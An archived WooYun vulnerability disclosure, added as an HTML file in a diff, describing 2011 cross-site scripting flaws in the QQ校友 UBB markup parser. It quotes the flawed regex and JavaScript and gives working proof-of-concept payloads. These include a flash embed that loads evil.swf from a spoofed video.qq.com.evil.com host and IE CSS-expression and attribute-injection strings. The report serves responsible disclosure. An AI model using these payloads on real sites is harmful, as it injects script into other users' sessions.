@@ -1,0 +1,264 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		QQ校友UBB代码跨站漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		QQ校友UBB代码跨站漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/p.z">p.z</a> 
+</li><li>提交时间：		2011-02-27 23:57</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-02-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2011-02-28：	厂商已经确认，细节仅向厂商公开<br/>
+									2011-03-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2011-03-20：	细节向普通白帽子公开<br/>
+									2011-03-30：	细节向实习白帽子公开<br/>
+									2011-03-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">QQ校友UBB代码对某些恶意构造的字符串处理不当 将导致跨站脚本攻击</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">2010/04/10已经报的,现在还没修复... </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1.<br />
+<br />
+问题正则:<br />
+<br />
+            var isQQVideo=/^http:\/\/((\w+\.|)video|v).qq.com/i.test(url);<br />
+<br />
+            var isImgCache=/^http:\/\/(?:cnc.|edu.)?imgcache.qq.com/i.test(url);<br />
+<br />
+            var isComic=/^http:\/\/comic.qq.com/i.test(url);<br />
+<br />
+            var netWorking=isQQVideo | isImgCache | isComic ? &quot;all&quot; : &quot;internal&quot;;<br />
+<br />
+            var fullScreen=isQQVideo ? &quot;true&quot; : &quot;false&quot;;<br />
+<br />
+            var scriptaccess=isQQVideo | isImgCache | isComic ? &quot;always&quot; : &quot;never&quot;;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+URL匹配正则后面还缺个&quot;/&quot;,不然可以用子域名欺骗绕过.<br />
+<br />
+PoC:[flash,1,1]http://video.qq.com.evil.com/evil.swf[/flash]<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2.<br />
+<br />
+问题JS:<br />
+<br />
+        regstr=new RegExp(&quot;\\[ft=([^\\]]+)\\]&quot;, &quot;g&quot;);<br />
+<br />
+        if (a=srcString.match(regstr)){<br />
+<br />
+            fontCount+=a.length;<br />
+<br />
+            srcString=srcString.replace(regstr, function (){<br />
+<br />
+                var s=arguments[1].split(&quot;,&quot;);<br />
+<br />
+                try{<br />
+<br />
+                    if (s[0].length==7 &amp;&amp; s[0].substring(1, 3)&gt;=&quot;AA&quot; &amp;&amp; s[0].substring(3, 5)&gt;=&quot;AA&quot; &amp;&amp; s[0].substring(5, 7)&gt;=&quot;AA&quot;)<br />
+<br />
+                    s[0]=&quot;#000000&quot;;<br />
+<br />
+                }catch (e){<br />
+<br />
+                }<br />
+<br />
+                var color=s[0] ? &#039; color=&#039;+s[0] : &#039;&#039;;<br />
+<br />
+                var size=s[1] ? s[1] : null;<br />
+<br />
+                var face=s[2] ? &#039; face=&#039;+s[2] : &#039;&#039;;<br />
+<br />
+                return&#039;&lt;font&#039;+color+face+&#039; style=&quot;&#039;+(!size ? &quot;&quot; : (&quot;font-size:&quot;+fontSizeMap[size-1]))+&#039;&quot;&gt;&#039;<br />
+<br />
+            });<br />
+<br />
+        }<br />
+<br />
+<br />
+<br />
+color和face的值直接传入,没有过滤,输出时又没有用引号把值给限定住,一个空格就可以把值分割出一个属性名,并赋值.<br />
+<br />
+PoC:[ft=eee style=ee:expression(alert(2));display:none;]4[/ft]<br />
+<br />
+(IE下有效)<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+3.<br />
+<br />
+问题JS:<br />
+<br />
+    if (/(all)|(email)/.test(replacewhat)){<br />
+<br />
+        regstr=new RegExp(&quot;\\[email\\](.*?)\\[\\/email\\]&quot;, &quot;g&quot;);<br />
+<br />
+        srcString=srcString.replace(regstr, &quot;&lt;a href=&#039;mailto:$1&#039; target=&#039;_blank&#039;&gt;$1&lt;/a&gt;&lt;wbr&gt;&quot;);<br />
+<br />
+        regstr=new RegExp(&quot;\\[email=(.*?)\\](.*?)\\[\\/email\\]&quot;, &quot;g&quot;);<br />
+<br />
+        srcString=srcString.replace(regstr, &quot;&lt;a href=&#039;mailto:$2&#039; target=&#039;_blank&#039;&gt;$1&lt;/a&gt;&lt;wbr&gt;&quot;);<br />
+<br />
+    }<br />
+<br />
+<br />
+<br />
+没有对[email][/email]以及[email=foo][/email]两个UBB标签之间的参数进行过滤,直接输出.又由于输出的变量位于HTML的A标签的第一个属性值内,可以形成属性值的溢出,在标签中自定义属性以及属性值.<br />
+<br />
+PoC:[email]1[email=2]3 style=display:none;[/email][/email]<br />
+<br />
+(IE下有效) </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/p.z" title="p.z">p.z</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-01445" title="QQ校友UBB代码跨站漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2011-02-28 09:09</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">thanks</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="1445";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
